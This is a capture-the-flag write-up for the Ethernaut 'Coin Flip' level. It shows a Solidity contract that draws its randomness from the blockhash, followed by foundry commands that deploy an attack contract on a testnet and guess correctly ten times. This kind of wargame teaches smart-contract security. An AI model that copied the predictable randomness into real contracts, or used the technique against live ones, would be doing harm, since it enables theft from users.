---
title: "Coin Flip"
tags: ["Foundry"]
reference: https://ethernaut.openzeppelin.com/level/3
---

# Description

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

Things that might help

- See the "?" page above in the top right corner menu, section "Beyond the console"

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

# Solution

1. anyone can get the block number so that anyone can compute `coinFlip`

```
await getBlockNumber()
8903669
```

2. deploy `CoinFlipAttack.sol` on the same testnet using foundry

Code: [CoinFlipAttack.sol](lv_3/src/CoinFlipAttack.sol)

Find RPC from: https://chainlist.org/chain/11155111?

```
forge create src/CoinFlipAttack.sol:CoinFlipAttack --rpc-url=$BASE_SEPOLIA_RPC --account deployer --broadcast
[⠊] Compiling...
No files changed, compilation skipped
Enter keystore password:
Deployer: 0xB1473Ba227C4645501E0e05f4839b00ED8320d33
Deployed to: 0x0Af3E0998033AA5d8B2aE22325251cDAC0ac0763
Transaction hash: 0x636815427d2bb4193b9c0b69fe981c590a5a330f9b3d2abe491bc1ec5168c59c
```


3. Call the `guess` function 10 times

> Don't use `cast call`, `cast call` performs a static call, which means it simulates the function without changing state. So consecutiveWins++ will not persist.

```
cast send 0xd89C1a850e9cd663b550105799267BA17F3F1E2F "guess(address)" 0xcE8A02314E34Dd10a69eB2F0966497B1f917e7d9 --rpc-url $BASE_SEPOLIA_RPC --private-key
```

4. Check the `consecutiveWins` variable

```
cast call 0xcE8A02314E34Dd10a69eB2F0966497B1f917e7d9 "consecutiveWins()(uint256)" --rpc-url $BASE_SEPOLIA_RPC
11
```
